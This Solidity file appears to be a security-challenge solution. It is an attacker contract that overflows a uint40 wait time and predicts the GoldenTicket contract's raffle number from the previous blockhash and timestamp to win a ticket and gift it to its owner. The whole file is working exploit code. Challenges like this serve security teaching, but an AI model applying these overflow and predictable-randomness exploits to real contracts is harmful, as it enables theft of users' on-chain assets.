// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../GoldenTicket.sol";

contract GoldenTicketAttacker {
    GoldenTicket target;
    address owner;

    constructor(address _victimAddress, address _owner) {
        target = GoldenTicket(_victimAddress);
        owner = _owner;
    }

    function attack() external {
        target.joinWaitlist();
        target.updateWaitTime(
            type(uint40).max - target.waitlist(address(this)) + 2
        );
        target.joinRaffle(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        require(target.hasTicket(address(this)), "Failed");

        target.giftTicket(owner);
    }
}
